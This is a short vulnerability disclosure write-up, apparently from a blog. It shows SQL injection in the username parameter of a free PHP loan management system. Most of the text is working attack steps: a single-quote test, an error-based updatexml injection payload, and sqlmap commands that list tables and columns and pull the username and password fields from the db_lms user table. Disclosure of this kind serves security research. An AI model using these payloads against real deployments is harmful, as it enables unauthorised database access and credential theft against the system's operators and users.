# Briefly
In the modification of personal data of this System, Sql injection vulnerability exists in usernameparameter, which can be used by attackers to steal malicious information.
# Process demonstration
Login interface, enter a single quote to test whether there is SQL injection
![在这里插入图片描述](https://img-blog.csdnimg.cn/2bb9b9dc6a1f44e086d13f383c6fbd6e.png)
There is SQL injection. At the same time, it is verified that the closing method is single-quote closure. Try single-quote injection.
Inject the payload as
```
1'and updatexml(1,concat(0x7e,database(),0x7e),1)#
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0d1685af002c46489e19a2da934dfa86.png)
Successfully obtained the database, then use burpsuite to capture packets to obtain data packets
![在这里插入图片描述](https://img-blog.csdnimg.cn/06610f8b1d51457882ee778dc7375092.png)
Use the tool sqlmap to attack and obtain the data table payload
```
python sqlmap.py -r "D:\sqlmap\3.txt"  -D "db_lms"  --tables
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0d83b95d16e54ad686fc975ce2a79c43.png)
Get column information payload
```
python sqlmap.py -r "D:\sqlmap\3.txt"  -D "db_lms" -T "user" --columns
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1ccadd6933ef463d8129463d5ea37489.png)
```
python sqlmap.py -r "D:\sqlmap\3.txt"  -D "db_lms" -T "user" -C "username,password" --columns
```
Get field information payload
![在这里插入图片描述](https://img-blog.csdnimg.cn/b7bfb674c4a34d4db7c63624a12be7e0.png)
source link
https://www.sourcecodester.com/php/15529/loan-management-system-oop-php-mysqlijquery-free-source-code.html
